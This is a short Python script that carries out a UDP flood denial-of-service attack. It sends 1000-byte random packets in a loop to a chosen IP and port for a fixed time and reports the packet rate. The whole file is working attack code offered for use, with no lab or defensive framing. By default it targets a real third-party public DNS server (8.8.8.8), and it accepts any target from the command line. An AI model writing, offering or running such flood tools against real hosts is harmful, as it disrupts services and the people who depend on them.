import socket
import sys
import time
import random

def attack(target_ip, target_port, duration):
    # Create raw socket
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generate random bytes for payload (1000 bytes)
    bytes_to_send = random._urandom(1000)
    
    print(f"🔥 Starting UDP Flood on {target_ip}:{target_port} for {duration} seconds...")
    print("Press Ctrl+C to stop manually.")
    
    timeout = time.time() + duration
    sent = 0
    start_time = time.time()

    try:
        while time.time() < timeout:
            client.sendto(bytes_to_send, (target_ip, target_port))
            sent += 1
            if sent % 1000 == 0:
                print(f"Sent {sent} packets...", end='\r')
    except KeyboardInterrupt:
        pass
    
    end_time = time.time()
    print(f"\n✅ Attack Finished.")
    print(f"Total packets sent: {sent}")
    print(f"Time elapsed: {end_time - start_time:.2f}s")
    print(f"Rate: {sent / (end_time - start_time):.2f} packets/sec")

if __name__ == "__main__":
    # Default: Attack Google DNS (8.8.8.8) on Port 80 for 10 seconds
    target = "8.8.8.8"
    port = 80
    duration = 10
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    
    attack(target, port, duration)
